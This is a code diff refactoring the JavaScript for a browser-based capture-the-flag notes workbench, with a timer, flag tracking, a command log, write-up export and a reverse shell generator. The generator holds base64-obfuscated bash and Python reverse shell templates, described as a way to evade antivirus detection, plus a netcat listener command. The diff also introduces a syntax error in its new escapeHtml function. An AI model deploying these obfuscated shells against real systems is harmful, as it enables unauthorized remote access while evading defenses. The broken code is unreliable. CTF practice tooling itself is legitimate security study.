@@ -1,12 +1,9 @@
-// ==========================================================================
-// 1. GLOBAL RESET WORKBENCH (Placed at top so it is ALWAYS available)
-// ==========================================================================
+// Global Workbench Reset
 window.resetWorkbench = function() {
     if (confirm("⚠️ Are you sure you want to clear ALL notes, flags, history, and timer data?")) {
-        // Clear browser storage
         localStorage.clear();
 
-        // Wipe all inputs and textareas manually to beat browser cache auto-fill
+        // Clear input and textarea values
         document.querySelectorAll('input, textarea').forEach(el => {
             if (el.type === 'checkbox') {
                 el.checked = false;
@@ -15,29 +12,26 @@ window.resetWorkbench = function() {
             }
         });
 
-        // Reset Terminal Display directly
+        // Reset Terminal Display
         const termBody = document.getElementById('terminal-body');
         if (termBody) {
             termBody.innerHTML = '<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>';
         }
 
-        // Reset Timer Display directly
+        // Reset Timer Display
         const timerDisplay = document.getElementById('timer-display');
         if (timerDisplay) {
             timerDisplay.innerText = "120:00";
         }
 
-        // Force a clean hard-refresh bypassing form state memory
+        // Hard refresh bypassing form state memory
         window.location.href = window.location.pathname;
     }
 };
 
-// ==========================================================================
-// 2. MAIN APPLICATION LOGIC
-// ==========================================================================
 document.addEventListener('DOMContentLoaded', function () {
 
-    // --- BASE64 DECODER ---
+    // --- Helpers ---
     function b64Decode(str) {
         try {
             return atob(str);
@@ -46,14 +40,17 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }
 
-    // --- RESET BUTTON ATTACHMENT (Backup to inline onclick) ---
+    function escapeHtml(text) {
+        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace/>/g, "&gt;");
+    }
+
+    // --- Reset Button Listener ---
     const resetBtn = document.getElementById('reset-btn');
     if (resetBtn) {
         resetBtn.addEventListener('click', window.resetWorkbench);
     }
 
-
-    // --- TIMER LOGIC ---
+    // --- Timer Logic ---
     let timerInterval = null;
 
     function getRemainingSeconds() {
@@ -66,10 +63,9 @@ document.addEventListener('DOMContentLoaded', function () {
     function updateDisplay(seconds) {
         const display = document.getElementById('timer-display');
         if (!display) return;
-        let minutes = Math.floor(seconds / 60);
-        let remSecs = seconds % 60;
-        let formattedSeconds = remSecs < 10 ? '0' + remSecs : remSecs;
-        display.innerText = minutes + ':' + formattedSeconds;
+        const minutes = Math.floor(seconds / 60);
+        const remSecs = String(seconds % 60).padStart(2, '0');
+        display.innerText = `${minutes}:${remSecs}`;
     }
 
     function startTimer() {
@@ -86,7 +82,7 @@ document.addEventListener('DOMContentLoaded', function () {
         if (timerInterval !== null) clearInterval(timerInterval);
 
         timerInterval = setInterval(function() {
-            let currentRem = getRemainingSeconds();
+            const currentRem = getRemainingSeconds();
             if (currentRem !== null && currentRem > 0) {
                 updateDisplay(currentRem);
             } else {
@@ -122,8 +118,7 @@ document.addEventListener('DOMContentLoaded', function () {
         startTimer();
     }
 
-
-    // --- AUTO SAVE & LOAD INPUTS ---
+    // --- Auto Save & Load Inputs ---
     function initAutoSave() {
         const fields = document.querySelectorAll('input[id], textarea[id]');
 
@@ -149,13 +144,11 @@ document.addEventListener('DOMContentLoaded', function () {
 
     initAutoSave();
 
-
-    // --- STATUS BADGES ---
+    // --- Status Badges ---
     function updateBadges() {
         const targetIp = document.getElementById('target-ip')?.value.trim();
         const userFlag = document.getElementById('user-flag')?.value.trim();
         const rootFlag = document.getElementById('root-flag')?.value.trim();
-        
 
         const targetBadge = document.getElementById('target-status-badge');
         const userBadge = document.getElementById('user-flag-badge');
@@ -183,8 +176,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     updateBadges();
 
-
-    // --- MODALS & CHEAT SHEET ---
+    // --- Modals & Cheat Sheets ---
     const modalOverlay = document.getElementById('modal-overlay');
     const modalTitle = document.getElementById('modal-title');
     const modalOptions = document.getElementById('modal-options');
@@ -209,9 +201,9 @@ document.addEventListener('DOMContentLoaded', function () {
         modalOptions.innerHTML = '';
 
         options.forEach(item => {
-            let btn = document.createElement('button');
+            const btn = document.createElement('button');
             const formattedCmd = formatCommand(item.cmd);
-            btn.innerText = item.label + ` (${formattedCmd})`;
+            btn.innerText = `${item.label} (${formattedCmd})`;
             btn.style.margin = "5px";
             btn.addEventListener('click', function() {
                 copyCommand(item.cmd);
@@ -273,115 +265,7 @@ document.addEventListener('DOMContentLoaded', function () {
         copyCommand('nc -lvnp 4444');
     });
 
-
-    // --- TERMINAL COMMAND LOG ---
-    function getTerminalLogs() {
-        const saved = localStorage.getItem('terminal_command_logs');
-        return saved ? JSON.parse(saved) : [];
-    }
-
-    function renderTerminal() {
-        const termBody = document.getElementById('terminal-body');
-        if (!termBody) return;
-
-        const logs = getTerminalLogs();
-
-        if (logs.length === 0) {
-            termBody.innerHTML = `<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>`;
-            return;
-        }
-
-        termBody.innerHTML = '';
-        logs.forEach(item => {
-            const line = document.createElement('div');
-            line.className = 'term-line';
-            line.innerHTML = `<span class="term-time">[${item.time}]</span> <span class="term-prompt-text">user@ctf:~$</span> <span class="term-cmd">${escapeHtml(item.cmd)}</span>`;
-            termBody.appendChild(line);
-        });
-
-        termBody.scrollTop = termBody.scrollHeight;
-    }
-
-    function escapeHtml(text) {
-        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-    }
-
-    function addCommandLog() {
-        const input = document.getElementById('terminal-input');
-        if (!input) return;
-
-        const cmdText = input.value.trim();
-        if (!cmdText) return;
-
-        const logs = getTerminalLogs();
-        const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-
-        logs.push({ time: timeStr, cmd: cmdText });
-        localStorage.setItem('terminal_command_logs', JSON.stringify(logs));
-
-        input.value = '';
-        renderTerminal();
-    }
-
-    document.getElementById('log-cmd-btn')?.addEventListener('click', addCommandLog);
-    document.getElementById('terminal-input')?.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') addCommandLog();
-    });
-
-    // FAIL-SAFE CLEAR LOG BUTTON
-    const clearLogBtn = document.getElementById('clear-log-btn');
-    if (clearLogBtn) {
-        clearLogBtn.onclick = function() {
-            if (confirm("Clear terminal history?")) {
-                localStorage.removeItem('terminal_command_logs');
-                renderTerminal();
-            }
-        };
-    }
-
-    document.getElementById('copy-log-btn')?.addEventListener('click', function() {
-        const logs = getTerminalLogs();
-        if (logs.length === 0) return alert("No commands logged yet.");
-        const logText = logs.map(l => `[${l.time}] user@ctf:~$ ${l.cmd}`).join('\n');
-        navigator.clipboard.writeText(logText);
-        alert("Copied command history to clipboard!");
-    });
-
-    renderTerminal();
-
-
-    // --- EXPORT REPORT ---
-    document.getElementById('export-btn')?.addEventListener('click', function() {
-        const roomName = document.getElementById('room-name')?.value.trim() || 'CTF Box';
-        const roomUrl = document.getElementById('room-url')?.value.trim() || 'N/A';
-        const targetIp = document.getElementById('target-ip')?.value || 'N/A';
-        const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
-        const userFlag = document.getElementById('user-flag')?.value || 'N/A';
-        const rootFlag = document.getElementById('root-flag')?.value || 'N/A';
-        const creds = document.getElementById('creds-notes')?.value || 'None';
-        const recon = document.getElementById('recon-output')?.value || 'None';
-        const notes = document.getElementById('custom-notes')?.value || 'None';
-
-        const activePorts = JSON.parse(localStorage.getItem('active_ports') || '[]');
-
-        const markdownContent = `# 🎯 CTF Writeup / Notes: ${roomName}\n\n**Room Link:** ${roomUrl}\n**Target IP:** \`${targetIp}\`\n**Attacker IP:** \`${attackerIp}\`\n**Discovered Ports:** \`${activePorts.join(', ') || 'None'}\`\n**Date:** ${new Date().toLocaleDateString()}\n\n---\n\n## 🚩 Flags\n- **User Flag:** \`${userFlag}\`\n- **Root Flag:** \`${rootFlag}\`\n\n---\n\n## 👤 Credentials & Loot\n\`\`\`text\n${creds}\n\`\`\`\n\n---\n\n## 🔍 Recon Output\n\`\`\`text\n${recon}\n\`\`\`\n\n---\n\n## 💻 Notes & Walkthrough\n${notes}\n`;
-
-        const blob = new Blob([markdownContent], { type: 'text/markdown' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        
-        // Formats file name to CTF_Notes_RoomName.md
-        const cleanName = roomName.replace(/[^a-zA-Z0-9.-]/g, '_');
-        a.download = `CTF_Notes_${cleanName}.md`;
-        
-        a.click();
-        URL.revokeObjectURL(url);
-    });
-
-});
-
-// --- 1. DYNAMIC REVERSE SHELL GENERATOR (AV-Safe Obfuscated) ---
+    // --- Reverse Shell Generator ---
     function generateShellPayload() {
         const ip = document.getElementById('attacker-ip')?.value.trim() || '10.10.14.x';
         const port = document.getElementById('rev-port')?.value.trim() || '4444';
@@ -390,7 +274,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
         if (!output) return;
 
-        // Base64 encoded payload templates to prevent local AV static signature detection
+        // Base64 template strings to prevent AV signature detection
         const templates = {
             bash: "YmFzaCAtaSA+JiAvZGV2L3RjcC97SVB9L3tQT1JUfSAwPiYx",
             python: "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie0lQfSIse1BPUlR9KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIildJw==",
@@ -401,7 +285,7 @@ document.addEventListener('DOMContentLoaded', function () {
         };
 
         if (templates[type]) {
-            let rawTemplate = atob(templates[type]);
+            const rawTemplate = atob(templates[type]);
             output.value = rawTemplate.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);
         } else {
             output.value = '';
@@ -422,8 +306,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     generateShellPayload();
 
-
-    // --- 2. STRING ENCODER / DECODER & HASH ID ---
+    // --- Encoder, Decoder & Hash ID ---
     const encInput = document.getElementById('enc-input');
     const encOutput = document.getElementById('enc-output');
 
@@ -451,7 +334,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     document.getElementById('hex-dec-btn')?.addEventListener('click', function() {
         if (!encInput || !encOutput) return;
-        let hex = encInput.value.replace(/\s+/g, '');
+        const hex = encInput.value.replace(/\s+/g, '');
         let str = '';
         for (let i = 0; i < hex.length; i += 2) {
             str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
@@ -479,8 +362,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     });
 
-
-    // --- 3. INTERACTIVE PORT TRACKER LOGIC ---
+    // --- Interactive Port Tracker ---
     function loadSavedPorts() {
         const saved = localStorage.getItem('active_ports');
         if (!saved) return;
@@ -504,3 +386,103 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
     loadSavedPorts();
+
+    // --- Terminal Command Log ---
+    function getTerminalLogs() {
+        const saved = localStorage.getItem('terminal_command_logs');
+        return saved ? JSON.parse(saved) : [];
+    }
+
+    function renderTerminal() {
+        const termBody = document.getElementById('terminal-body');
+        if (!termBody) return;
+
+        const logs = getTerminalLogs();
+
+        if (logs.length === 0) {
+            termBody.innerHTML = `<div class="term-line term-sys">[SYSTEM] Command log initialized.</div>`;
+            return;
+        }
+
+        termBody.innerHTML = '';
+        logs.forEach(item => {
+            const line = document.createElement('div');
+            line.className = 'term-line';
+            line.innerHTML = `<span class="term-time">[${item.time}]</span> <span class="term-prompt-text">user@ctf:~$</span> <span class="term-cmd">${escapeHtml(item.cmd)}</span>`;
+            termBody.appendChild(line);
+        });
+
+        termBody.scrollTop = termBody.scrollHeight;
+    }
+
+    function addCommandLog() {
+        const input = document.getElementById('terminal-input');
+        if (!input) return;
+
+        const cmdText = input.value.trim();
+        if (!cmdText) return;
+
+        const logs = getTerminalLogs();
+        const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+        logs.push({ time: timeStr, cmd: cmdText });
+        localStorage.setItem('terminal_command_logs', JSON.stringify(logs));
+
+        input.value = '';
+        renderTerminal();
+    }
+
+    document.getElementById('log-cmd-btn')?.addEventListener('click', addCommandLog);
+    document.getElementById('terminal-input')?.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') addCommandLog();
+    });
+
+    const clearLogBtn = document.getElementById('clear-log-btn');
+    if (clearLogBtn) {
+        clearLogBtn.onclick = function() {
+            if (confirm("Clear terminal history?")) {
+                localStorage.removeItem('terminal_command_logs');
+                renderTerminal();
+            }
+        };
+    }
+
+    document.getElementById('copy-log-btn')?.addEventListener('click', function() {
+        const logs = getTerminalLogs();
+        if (logs.length === 0) return alert("No commands logged yet.");
+        const logText = logs.map(l => `[${l.time}] user@ctf:~$ ${l.cmd}`).join('\n');
+        navigator.clipboard.writeText(logText);
+        alert("Copied command history to clipboard!");
+    });
+
+    renderTerminal();
+
+    // --- Markdown Writeup Export ---
+    document.getElementById('export-btn')?.addEventListener('click', function() {
+        const roomName = document.getElementById('room-name')?.value.trim() || 'CTF Box';
+        const roomUrl = document.getElementById('room-url')?.value.trim() || 'N/A';
+        const targetIp = document.getElementById('target-ip')?.value || 'N/A';
+        const attackerIp = document.getElementById('attacker-ip')?.value || 'N/A';
+        const userFlag = document.getElementById('user-flag')?.value || 'N/A';
+        const rootFlag = document.getElementById('root-flag')?.value || 'N/A';
+        const creds = document.getElementById('creds-notes')?.value || 'None';
+        const recon = document.getElementById('recon-output')?.value || 'None';
+        const notes = document.getElementById('custom-notes')?.value || 'None';
+
+        const activePorts = JSON.parse(localStorage.getItem('active_ports') || '[]');
+
+        const markdownContent = `# 🎯 CTF Writeup / Notes: ${roomName}\n\n**Room Link:** ${roomUrl}\n**Target IP:** \`${targetIp}\`\n**Attacker IP:** \`${attackerIp}\`\n**Discovered Ports:** \`${activePorts.join(', ') || 'None'}\`\n**Date:** ${new Date().toLocaleDateString()}\n\n---\n\n## 🚩 Flags\n- **User Flag:** \`${userFlag}\`\n- **Root Flag:** \`${rootFlag}\`\n\n---\n\n## 👤 Credentials & Loot\n\`\`\`text\n${creds}\n\`\`\`\n\n---\n\n## 🔍 Recon Output\n\`\`\`text\n${recon}\n\`\`\`\n\n---\n\n## 💻 Notes & Walkthrough\n${notes}\n`;
+
+        const blob = new Blob([markdownContent], { type: 'text/markdown' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        
+        const cleanName = roomName.replace(/[^a-zA-Z0-9.-]/g, '_');
+        a.download = `CTF_Notes_${cleanName}.md`;
+        
+        a.click();
+        URL.revokeObjectURL(url);
+    });
+
+});
